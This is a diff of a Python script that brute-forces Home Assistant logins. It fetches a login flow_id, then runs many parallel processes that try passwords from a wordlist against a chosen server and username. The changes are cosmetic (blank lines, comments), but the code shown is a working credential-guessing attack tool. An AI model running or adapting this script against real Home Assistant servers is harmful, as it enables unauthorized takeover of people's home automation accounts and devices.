@@ -21,15 +21,12 @@ import time
 """
 def get_flow_id(host):
     data = "{\"client_id\":\"http://"+ host + "/\",\"handler\":[\"homeassistant\",null],\"redirect_uri\":\"http://"+ host +"/lovelace/0?auth_callback=1\"}"
-
     headers = "-H \'Content-Type: text/plain;charset=UTF-8\'"
-
     host = host + "/auth/login_flow"
     result = subprocess.run(["curl", "-d", data, headers, host, "-s"], stdout=subprocess.PIPE)
     flow_id = ""
     try:
         json_object = json.loads(result.stdout.decode())
-
         # Make sure we are dealing with homeassistant server and not with other server who might use the same JSON format.
         # This take care of when a user enters a non-HomeAssistant server that also uses flow_id to login.
         handler = json_object.get("handler")
@@ -53,7 +50,6 @@ def bruceforce(flow_id, host, username, passwords_queue, credential_found, queue
         if passwords_queue:
             queue_elem = passwords_queue.get()
             password = "\"" + queue_elem[1] + "\""
-
             count = queue_elem[0]
             data = "{\"username\":" + username + ",\"password\":" + password + ",\"client_id\":\"http://"+ client_id + "/\"}"
             # headers = "-H \'Content-Type: text/plain;charset=UTF-8\'"
@@ -77,7 +73,6 @@ def bruceforce(flow_id, host, username, passwords_queue, credential_found, queue
     # Please see reference (4)
     passwords_queue.cancel_join_thread()  # this allow the process to exit even when the multiprocessing.Queue is not empty.
 
-
 # This method load the passwords from a password text file, and load them in a queue that is shared among all processes.
 def prepare_passwords_queue(password, passwords_queue, credential_found, queue_ended):
     count = 0
@@ -100,7 +95,6 @@ def prepare_passwords_queue(password, passwords_queue, credential_found, queue_e
                 break
         # Closing files
         password.close()
-
     queue_ended.value = 42 # signal that the password queue ended
     # Please see reference (4)
     passwords_queue.cancel_join_thread()  # this allow the process to exit even when the multiprocessing.Queue is not empty.
@@ -111,7 +105,6 @@ def process_arguments():
     host = ""
     num_of_bruceforces = 20
     args = sys.argv
-
     for i in range(1, len(args)):
         if args[i] == "-s":
             host = args[i + 1]
@@ -123,7 +116,7 @@ def process_arguments():
             password = ("file", args[i + 1])
         elif args[i] == "-b":
             num_of_bruceforces = int(args[i + 1])
-
+    # If no arguments
     if len(args) == 1:
         print("Options:")
         print("\t-s: Specify the server's address with port number.")
@@ -147,6 +140,7 @@ def main():
     # Get the program arguments
     arguments = process_arguments()
 
+    # exit if no program argument provided
     if arguments == None:
         exit()
 
@@ -161,13 +155,13 @@ def main():
     # is slightly faster than bruce-forcing via multiple sessions
     # (i.e. each bruteforce process has its own flow_id is somewhat slower)
 
+    # Can't login if the flow_id is empty
     if flow_id == "":
         exit()
 
     # Running the bruce-force
     print("Running", num_of_bruteforces, "bruteforce processes in parallel")
     start_time = time.time()
-
     # Prepare the passwords_queue
     multiprocessing.Process(target=prepare_passwords_queue,
                             args=(password, passwords_queue, credential_found, queue_ended)).start()
@@ -178,10 +172,9 @@ def main():
         p.start()
         bruteforce_processes.append(p)
 
-    # The main() process wait for other processes to stop before proceed to next step.
+    # The main() process waits for other processes to stop before proceed to next step.
     for p in bruteforce_processes:
         p.join()
-
     end_time = time.time()
     print("Time taken: ", end_time - start_time, "secs")
 
